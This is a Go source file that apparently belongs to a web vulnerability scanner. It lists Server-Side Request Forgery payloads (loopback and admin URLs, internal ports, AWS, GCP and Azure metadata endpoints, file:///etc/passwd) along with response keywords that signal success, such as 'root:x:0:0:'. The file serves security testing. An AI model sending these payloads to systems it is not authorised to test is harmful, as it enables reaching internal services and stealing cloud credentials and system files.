package payloads

// SSRFPayloads contains a list of payloads to attempt for Server-Side Request Forgery (SSRF).
// This includes common external targets and various internal/metadata service targets.
var SSRFPayloads = []string{
	"http://example.com",
	"https://example.com",
	"http://www.google.com", // Another well-known external target.
	"http://127.0.0.1",      // Loopback address.
	"http://localhost",      // Loopback hostname.
	"http://localhost/admin", // Common admin interface path
	"http://127.0.0.1/admin",  // Common admin interface path
	"http://127.0.0.1:22",   // Attempting a commonly closed or different port (SSH).
	"http://127.0.0.1:80",   // If the target application runs on a different port.
	"http://127.0.0.1:7",    // Echo port, might time out or result in connection refused.
	"http://169.254.169.254", // AWS EC2 Metadata Service (requires specific headers for full access).
	"http://metadata.google.internal/computeMetadata/v1/", // GCP Metadata Service (requires Metadata-Flavor: Google header).
	"http://instance-data/latest/meta-data/",              // Azure Metadata Service.
	"file:///c:/boot.ini",                                 // Windows system file path.
	"file:///etc/passwd",                                  // Linux system file path.
}

// SSRFResponseKeywords contains keywords or patterns to look for in responses
// to indicate potential SSRF. These can be content from external pages
// or specific error messages indicating an attempt to connect to internal/invalid hosts.
var SSRFResponseKeywords = []string{
	// Content from example.com
	"Example Domain",
	"illustrative examples in documents",
	// Content from google.com (might need adjustment as Google often changes).
	"<title>Google</title>",
	// Common error messages indicating an attempt to connect to internal/invalid hosts.
	"Connection refused",
	"could not connect to server",
	"Failed to connect",
	"Unable to connect",
	"network is unreachable",
	"no route to host",
	"timeout connecting",
	"connection timed out",
	// Indications from AWS metadata service (if access is denied or partial).
	"\"code\" : \"ResourceNotFound\"",
	"\"Code\":\"InvalidToken\"",
	// Indications from file:///c:/boot.ini (Windows system file).
	"[boot loader]",
	// Indications from file:///etc/passwd (Linux system file).
	"root:x:0:0:",
	"daemon:x:1:1:",
	// Keywords for admin interfaces
	"<title>Administration panel</title>",
	"Admin interface",
	"delete user",
	"carlos",
}
